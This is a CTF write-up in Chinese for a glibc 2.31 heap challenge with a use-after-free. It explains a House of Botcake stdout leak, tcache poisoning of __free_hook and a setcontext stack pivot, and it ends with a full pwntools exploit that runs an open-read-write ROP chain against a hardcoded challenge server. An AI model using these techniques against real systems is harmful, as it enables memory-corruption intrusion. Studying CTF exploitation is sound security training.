
### 解题思路

本题是一道基于 glibc 2.31 版本的堆溢出利用题目。交互菜单中仅开放了 add、delete 与 edit 这三项常规操作，刻意剥离了用于回显的 show 功能。在执行 delete 释放对应的堆块时，程序并没有将底层的指针及 size 数据清空；同时 edit 机制依然允许对处于 freed 状态的 chunk 执行写入，从而直接暴露出一个能够被随意操纵的典型 UAF（Use-After-Free）漏洞。此外，程序部署了 seccomp 沙箱规则，其白名单限制了 syscall 的执行，仅仅放行了 open/read/write 等极个别的系统调用。因此，我们别无他法，只能通过构建 ORW 执行流来读取并打印出最终的 flag。

内存分配方面，程序预留了 16 个 slot 空位，允许用户申请的 size 阈值位于 1 至 1024 之间，这就意味着所有合法的申请尺寸都被完全涵盖在 tcache 的管辖范畴之内。程序的安全编译防御机制处于全开状态（包含了 Full RELRO、Canary、NX 以及 PIE）。由于缺失了 show 打印机制，常规的直接读取堆内残留数据的方法失效，我们必须转变思路，依靠伪造及篡改底层的 stdout FILE 结构体来强行逼迫程序泄露出 libc 的真实基址。

在针对 libc 基址的泄露阶段（Phase 1），核心手法是利用了 House of Botcake 技术的一种变体。第一步，先向系统申请两个物理相邻的堆块——A（大小为 0x90）与 B（大小为 0xa0），并在操作前将其对应大小的 tcache 链表预先填满。紧接着，我们释放堆块 A，让其自然掉落至 unsorted bin 当中，而后释放 B 引发内存的向后合并，从而拼凑出一个体积达 0x130 的巨型合并块 AB。随后的操作是 drain tcache 以清空该链表，并借助前述的 UAF 漏洞对块 B 发起二次 free，将其强行挂载回 tcache 里面。此时，chunk B 便拥有了双重身份：既是被包裹在 unsorted bin 大块中的一部分，又活跃于 tcache 链表中。

当我们尝试触发 unsorted bin 的 split 机制去分配一个 0x88 大小的内存块时，切割后残余的 remainder 位置十分巧合地落在原来的 B 处。在此机制下，glibc 会主动把 main_arena+96 的地址填充至 B 的 fd 属性内。鉴于 chunk B 依然存在于 tcache 结构里，我们可以利用 UAF 达成 partial overwrite（部分覆写），将其 fd 指针的末尾 2 个字节篡改为指向 `_IO_2_1_stdout_`（这一步需要承担 1/16 的概率去爆破 1 个 nibble）。完成修改后，只需连续发起两次 0x98 大小的分配请求，即可在第二次顺利劫持到 stdout。接着，通过在 stdout 结构内布置 `flags=0xfbad1800` 并将所有的 read 相关指针全部抹零，配合对 `write_base` 的最低字节实施为 0 的 partial overwrite，便能成功触发 IO 层的 flush 操作，顺利实现 libc 内存基址的泄露。

在成功掌握 libc 基址之后，利用链转入 Phase 2 阶段。我们使用了 3 轮针对 `tcache[0x90]` 的 poisoning 污染手法，把准备好的 payload 数据分段式地布入 `__free_hook` 附近的内存中。需要特别留意的是，之前为了泄露地址而残留在 unsorted bin 中的 remainder 已经被严重破坏，为了规避系统在后续分配时遍历该 bin 进而引发程序 crash 的风险，其后的每一笔内存申请都必须严格地约束在 tcache 内部执行。具体的 payload 植入分为三个批次完成：首轮写入是对准 `free_hook+0x110` 处，主要填入 ROP 执行链的尾端以及必需的 flag 路径字符串；次轮则聚焦于 `free_hook+0x88`，负责把 setcontext frame 结构的下半部分和 ROP 链的头部布置妥当；最后一轮则是直击 `free_hook+0x00` 处，精准打入 magic_gadget 与 setcontext+61 的绝对地址，至此，针对 hook 的劫持部署便大功告成。

最终的执行流触发极为清晰：直接调用 `free(trigger_chunk)` 进而顺畅地切入 magic_gadget（对应的底层汇编是 `mov rdx,[rdi+8]; call [rdx+0x20]`）。这会导致程序跳跃至 `setcontext+61` 地址处，依托 rdx 寄存器载入我们在前面伪造好的寄存器上下文数据，从而达成栈迁移（Stack Pivot）的战术目标。当这一套流转结束后，程序便会忠实地践行 `open("./flag") -> read -> write` 的 ROP 核心逻辑，把 flag 数据完美输出至屏幕的 stdout。

### Exp

```python
from pwn import *
import time

context(arch='amd64', os='linux', log_level='info')

# libc-2.31 关键偏移
STDOUT_OFF = 0x1ed6a0
FREE_HOOK_OFF = 0x1eee48
# mov rdx,[rdi+8]; call [rdx+0x20]
MAGIC_OFF = 0x151bb0
# setcontext+61: 从 rdx 加载寄存器上下文
SETCTX61_OFF = 0x54f5d
POP_RDI = 0x23b6a
POP_RSI = 0x2601f
POP_RDX_RBX = 0x15fae6
POP_RAX = 0x36174
SYSCALL_RET = 0x630a9
RET_SLED = 0x22679

TARGET_HOST = '39.96.193.120'
TARGET_PORT = 10011

def xor_key(addr):
    return (addr >> 12)

def pwn1(tube, nib):
    """House of Botcake 泄露 libc"""
    def note_add(idx, sz, data=b'A'):
        tube.sendlineafter(b'Choice', b'1')
        tube.sendlineafter(b'Index', str(idx).encode())
        tube.sendlineafter(b'Size', str(sz).encode())
        tube.sendafter(b'Content', data.ljust(sz, b'\x00')[:sz])

    def note_del(idx):
        tube.sendlineafter(b'Choice', b'2')
        tube.sendlineafter(b'Index', str(idx).encode())

    def note_edit(idx, data):
        tube.sendlineafter(b'Choice', b'3')
        tube.sendlineafter(b'Index', str(idx).encode())
        tube.sendafter(b'Content', data)

    # 耗尽 seccomp 残留 tcache
    for sz in [0x08, 0x18, 0x28, 0x48, 0x58, 0x68, 0x78, 0x88, 0x98, 0xb8, 0xd8]:
        for _ in range(50):
            note_add(15, sz)

    # 布局: A(0x88,idx0) | B(0x98,idx1) | guard(0x20,idx3) | X(0x98,idx2)
    note_add(0, 0x88)
    note_add(1, 0x98)
    note_add(3, 0x20)
    note_add(2, 0x98)

    # 填满 tcache[0xa0] 和 tcache[0x90]
    for i in range(4, 11):
        note_add(i, 0x98)
    for i in range(4, 11):
        note_del(i)
    for i in range(4, 11):
        note_add(i, 0x88)
    for i in range(4, 11):
        note_del(i)

    # A+B 合并进 unsorted bin
    note_del(0)
    note_del(1)

    # drain tcache[0xa0]
    for i in range(4, 11):
        note_add(i, 0x98)

    # X 和 B 进 tcache[0xa0]，head=B
    note_del(2)
    note_del(1)

    # drain tcache[0x90]
    for i in range(4, 11):
        note_add(i, 0x88)

    # split AB，remainder 落在 B 位置，glibc 写 B.fd = main_arena+96
    note_add(0, 0x88)

    # partial overwrite B.fd 低 2 字节指向 stdout
    note_edit(1, p16((nib << 12) | 0x6a0))

    # pop B
    note_add(1, 0x98)

    # pop stdout，写 FILE 结构体触发 leak
    tube.sendlineafter(b'Choice', b'1')
    tube.sendlineafter(b'Index', b'0')
    tube.sendlineafter(b'Size', b'152')
    tube.sendafter(b'Content', p64(0xfbad1800) + p64(0) * 3 + b'\x00')
    time.sleep(0.5)
    
    leaked = tube.clean(timeout=2)
    if len(leaked) < 16:
        return None, note_add, note_del, note_edit

    # 从泄露数据中搜索 libc 指针
    libc_base = 0
    for i in range(0, len(leaked) - 7):
        val = u64(leaked[i:i + 8])
        if (val >> 40) == 0x7f:
            for off in [0x1ec980, 0x1ecbe0, 0x1ed6a0, 0x1ed5c0, 0x1ed4a0]:
                cand = val - off
                if cand > 0 and cand & 0xfff == 0:
                    libc_base = cand
                    break
            if libc_base:
                break
                
    return libc_base, note_add, note_del, note_edit

def pwn2(tube, libc_base, note_add, note_del, note_edit):
    """3 次 tcache poisoning 写 ORW payload 到 __free_hook 区域"""
    free_hook = libc_base + FREE_HOOK_OFF
    magic = libc_base + MAGIC_OFF
    setctx = libc_base + SETCTX61_OFF
    ret = libc_base + RET_SLED
    rop_start = free_hook + 0xb8
    flag_str = free_hook + 0x190
    read_buf = free_hook + 0x300

    # ORW ROP: open("./flag",0) -> read(3,buf,0x100) -> write(1,buf,0x100)
    chain = b''
    chain += p64(libc_base + POP_RDI) + p64(flag_str)
    chain += p64(libc_base + POP_RSI) + p64(0)
    chain += p64(libc_base + POP_RAX) + p64(2)
    chain += p64(libc_base + SYSCALL_RET)
    chain += p64(libc_base + POP_RDI) + p64(3)
    chain += p64(libc_base + POP_RSI) + p64(read_buf)
    chain += p64(libc_base + POP_RDX_RBX) + p64(0x100) + p64(0)
    chain += p64(libc_base + POP_RAX) + p64(0)
    chain += p64(libc_base + SYSCALL_RET)
    chain += p64(libc_base + POP_RDI) + p64(1)
    chain += p64(libc_base + POP_RSI) + p64(read_buf)
    chain += p64(libc_base + POP_RDX_RBX) + p64(0x100) + p64(0)
    chain += p64(libc_base + POP_RAX) + p64(1)
    chain += p64(libc_base + SYSCALL_RET)
    
    D = 0.3
    sl = lambda d: (tube.sendline(d), time.sleep(D))
    sd = lambda d: (tube.send(d), time.sleep(D))

    # --- 第一次 poisoning: free_hook+0x110 写 ROP 后半段 + flag 路径 ---
    sl(b'2'); sl(b'4')
    sl(b'2'); sl(b'5')
    sl(b'3'); sl(b'5'); sd(p64(free_hook + 0x110) + b'\x00' * (0x88 - 8))
    sl(b'1'); sl(b'4'); sl(b'136'); sd(b'\x00' * 0x88)
    block1 = bytearray(0x88)
    block1[0:len(chain[88:])] = chain[88:]
    block1[0x80:0x87] = b'./flag\x00'
    sl(b'1'); sl(b'5'); sl(b'136'); sd(bytes(block1))

    # --- 第二次 poisoning: free_hook+0x88 写 frame 尾部 + ROP 前半段 ---
    sl(b'2'); sl(b'6')
    sl(b'2'); sl(b'7')
    sl(b'3'); sl(b'7'); sd(p64(free_hook + 0x88) + b'\x00' * (0x88 - 8))
    sl(b'1'); sl(b'6'); sl(b'136'); sd(b'\x00' * 0x88)
    block2 = bytearray(0x88)
    block2[0x20:0x28] = p64(rop_start)  # [rdx+0xa0] = rsp
    block2[0x28:0x30] = p64(ret)        # [rdx+0xa8] = RIP
    block2[0x30:0x30 + 88] = chain[:88]
    sl(b'1'); sl(b'7'); sl(b'136'); sd(bytes(block2))

    # 准备 trigger chunk
    sl(b'3'); sl(b'10'); sd(p64(0) + p64(free_hook + 8) + b'\x00' * (0x88 - 16))

    # --- 第三次 poisoning: free_hook+0x00 写 magic_gadget + setcontext ---
    sl(b'2'); sl(b'8')
    sl(b'2'); sl(b'9')
    sl(b'3'); sl(b'9'); sd(p64(free_hook) + b'\x00' * (0x88 - 8))
    sl(b'1'); sl(b'8'); sl(b'136'); sd(b'\x00' * 0x88)
    block3 = bytearray(0x88)
    block3[0x00:0x08] = p64(magic)
    block3[0x28:0x30] = p64(setctx)
    sl(b'1'); sl(b'9'); sl(b'136'); sd(bytes(block3))

    # 触发: free(trigger) -> magic -> setcontext -> ROP -> ORW
    sl(b'2'); sl(b'10')

def pwn3(tube):
    """接收 flag 输出"""
    time.sleep(2)
    result = tube.recvall(timeout=5)
    if result:
        log.success(f"FLAG: {result}")
        return True
    return False

if __name__ == '__main__':
    for nib in range(16):
        log.info(f"nibble = {nib:#x}")
        try:
            tube = remote(TARGET_HOST, TARGET_PORT)
            libc_base, note_add, note_del, note_edit = pwn1(tube, nib)
            
            if not libc_base:
                tube.close()
                time.sleep(0.5)
                continue
                
            log.success(f"libc base: {hex(libc_base)}")
            pwn2(tube, libc_base, note_add, note_del, note_edit)
            
            if pwn3(tube):
                break
                
            tube.close()
            
        except Exception as e:
            log.warning(f"[{nib:#x}] {e}")
            
        time.sleep(0.5)
```